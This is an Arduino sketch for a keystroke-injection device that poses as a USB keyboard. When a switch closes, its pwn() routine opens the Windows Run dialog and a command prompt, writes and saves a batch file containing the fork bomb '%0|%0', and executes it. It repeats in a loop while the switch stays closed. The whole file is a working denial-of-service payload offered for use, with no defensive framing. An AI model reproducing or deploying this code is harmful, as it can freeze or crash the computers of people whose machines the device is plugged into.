#include <Arduino.h>
#include <Keyboard.h>
const unsigned int led1Pin = 8; // green
const unsigned int inPin = 7; // switch
unsigned int d = 0;
const unsigned int delayTime = 1500;
boolean run = false;

void setup() {
  pinMode(inPin, INPUT);
  }

void checkRun() { // if this returns true, the program will not run
  d = digitalRead(7);
  if (d == 0)
  {
    run = true; // if this returns true, the switch is closed
  }
  else
  {
    run = false;
  }
}

void pwn() {
  Keyboard.begin();
  Keyboard.press(0x83);
  Keyboard.write('r');
  Keyboard.release(0x83);
  delay(500);
  Keyboard.println("cmd");
  Keyboard.write(0xB0);
  delay(500);
  Keyboard.println("echo.>pwn.bat");
  Keyboard.write(0xB0);
  Keyboard.println("notepad pwn.bat");
  Keyboard.write(0xB0);
  delay(700);
  Keyboard.println("%0|%0");
  Keyboard.press(0x80);
  Keyboard.write('s');
  Keyboard.release(0x80);
  Keyboard.press(0x82);
  Keyboard.write(0xC5);
  Keyboard.release(0x82);
  Keyboard.println("pwn.bat");
  Keyboard.write(0xB0);
  Keyboard.end();
}

void loop() {
  checkRun();
  while (run == true) {
    pwn();
  }
}

